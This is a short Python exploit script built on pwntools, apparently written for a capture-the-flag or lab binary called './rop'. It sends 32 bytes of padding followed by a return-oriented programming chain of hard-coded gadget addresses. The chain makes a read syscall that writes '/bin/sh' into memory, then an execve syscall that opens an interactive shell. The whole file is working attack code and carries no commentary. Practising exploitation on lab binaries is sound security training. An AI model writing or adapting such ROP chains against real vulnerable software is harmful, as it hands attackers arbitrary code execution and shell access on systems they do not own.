
from pwn import *


r=process('./rop')

pop_eax_ret=0x080b90f6
pop_ebx_ret=0x080481c9
pop_ecx_ret=0x080595b3
pop_edx_ret=0x0806e7da

buf=0x080ee000-100

int_ret=0x0806ef00

rop=[
	pop_eax_ret,
	3,
	pop_ebx_ret,
	0,
	pop_ecx_ret,
	buf,
	pop_edx_ret,
	50,
	int_ret,
	pop_eax_ret,
	11,
	pop_ebx_ret,
	buf,
	pop_ecx_ret,
	0,
	pop_edx_ret,
	0,
	int_ret
]


r.sendline('a'*32+flat(rop))

sleep(3)

r.sendline('/bin/sh\x00')

r.interactive()


